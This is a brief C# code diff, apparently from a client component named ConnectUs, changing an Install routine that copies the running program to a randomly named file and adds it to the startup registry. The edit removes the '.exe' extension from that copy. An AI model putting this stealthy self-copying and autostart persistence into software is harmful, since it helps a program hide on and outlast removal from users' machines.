@@ -25,7 +25,7 @@ namespace ConnectUs.Core.ClientSide
         public string Install()
         {
             var fileName = _fileService.GenerateRandomFileName();
-            var targetFilePath = Path.Combine(RootPath, fileName + ".exe");
+            var targetFilePath = Path.Combine(RootPath, fileName);
 
             _fileService.Copy(_environment.ApplicationPath, targetFilePath);
             _registry.AddFileToStartupRegistry(targetFilePath);
